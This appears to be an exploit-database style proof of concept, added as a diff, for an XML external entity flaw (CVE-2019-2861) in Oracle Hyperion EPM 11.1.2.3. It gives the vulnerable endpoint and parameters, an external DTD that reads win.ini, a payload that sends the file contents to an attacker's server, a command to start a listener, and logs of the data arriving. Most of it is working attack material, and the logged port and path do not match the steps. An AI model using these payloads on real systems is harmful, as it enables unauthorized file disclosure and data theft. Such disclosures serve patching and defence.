@@ -1,0 +1,53 @@
+- Exploit Title: XXE Injection Oracle Hyperion 
+- Exploit Author: Lucas Dinucci (idntk.lucdin@gmail.com)
+- Twitter: @identik1t
+- Vendor Homepage: https://www.oracle.com/applications/performance-management
+- Date: 02/11/2019
+- Affected Product: Oracle Hyperion Enterprise Performance Management System
+- Version: 11.1.2.3
+- CVE: CVE-2019-2861
+- Patch: https://www.oracle.com/technetwork/security-advisory/cpujul2019-5072835.html
+- Vulnerability Type: https://cwe.mitre.org/data/definitions/611.html
+
+
+# XML External Entity (XXE) Injection 
+
+
+The event.pt1:pt_region0:1:pc2:fvtbl, event.pt1:pt_region0:1:findBtn1 and oracle.adf.view.rich.monitoring.UserActivityInfo parameters are prone to XXE injection. An authenticated attacker could exploit this vulnerability to disclose internal files using the file URI handler, internal file shares, internal port scanning, remote code execution and denial of service attacks.
+
+Path: http://host:19000/calcmgr/faces/cmshell?_adf.ctrl-state=i38w0cig2_4
+
+Parameters: event.pt1:pt_region0:1:pc2:fvtbl, event.pt1:pt_region0:1:findBtn1 and oracle.adf.view.rich.monitoring.UserActivityInfo (POST REQUEST)
+
+
+# Proof-of-concept
+
+
+1 - Create a file and name it as xxe_poc with the following content, replacing with your server address:
+
+	
+<!ENTITY % payload SYSTEM "file:///c:\\Windows\\win.ini">
+<!ENTITY % param1 "<!ENTITY &#x25; external SYSTEM 'http://your_server_address/log_xxe?data=%payload;'>">
+
+
+2 - Start a webserver to receive the connection, such as:
+
+
+sudo python -m SimpleHTTPServer 80
+
+
+3 - Place the following payload in one of the vulnerable parameters, replacing with your server address:
+
+
+<!DOCTYPE foo [ <!ENTITY % pe SYSTEM "http://your_server_address/xxe_poc"> %pe; %param1; %external;]><m xmlns="http://oracle.com/richClient/comm"><k v="type"><s>action</s></k></m>
+
+
+4 - Data retrivial:
+
+Serving HTTP on 0.0.0.0 port 8000 ...
+
+192.168.13.1 - - [11/Feb/2019 04:59:47] "GET /xxe_poc HTTP/1.1" 200 -
+
+192.168.13.1 - - [11/Feb/2019 04:59:47] code 404, message File not found
+
+192.168.13.1 - - [11/Feb/2019 04:59:47] "GET /log?data=; HTTP/1.1" 200 -;%20for%2016-bit%20app%20support%20[fonts]%20[extensions]%20[mci%20extensions]%20[files] HTTP/1.1" 400 -
